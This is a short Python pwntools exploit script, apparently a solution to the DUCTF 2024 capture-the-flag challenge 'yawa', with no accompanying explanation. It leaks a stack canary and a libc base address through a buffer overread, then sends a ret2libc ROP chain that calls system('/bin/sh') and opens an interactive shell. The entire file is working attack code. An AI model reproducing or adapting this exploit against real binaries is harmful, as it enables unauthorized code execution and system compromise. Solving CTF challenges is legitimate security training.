from pwn import * 
#io = process("./yawa")
io = remote("2024.ductf.dev",30010)
libc = ELF("./libc.so.6")

def set_name(name):
    io.sendlineafter(b">",b"1")
    io.sendline(name)

def print_name():
    io.sendlineafter(b">",b"2")


set_name(b"A"*0x58)
print_name()
io.recvuntil(b"A"*0x58 + b"\n")
canary = u64(b"\x00" + io.recv(7))
log.info("CANARY: " + hex(canary))

set_name(b"A"*0x67)
print_name()
io.recvuntil(b"A"*0x67 + b"\n")
libc.address = u64(io.recv(6).ljust(8,b"\x00")) - 171408
log.info("LIBC BASE: " + hex(libc.address))


pop_rdi = p64(libc.address + 0x2a3e5)
ret = p64(libc.address + 0x2a3e6)

ret2libc  = b"A"*0x58 + p64(canary) + b"A"*8
ret2libc += pop_rdi
ret2libc += p64(next(libc.search(b"/bin/sh")))
ret2libc += ret + p64(libc.symbols["system"])
set_name(ret2libc)
#gdb.attach(io)
io.sendlineafter(b">",b"3")
io.interactive()

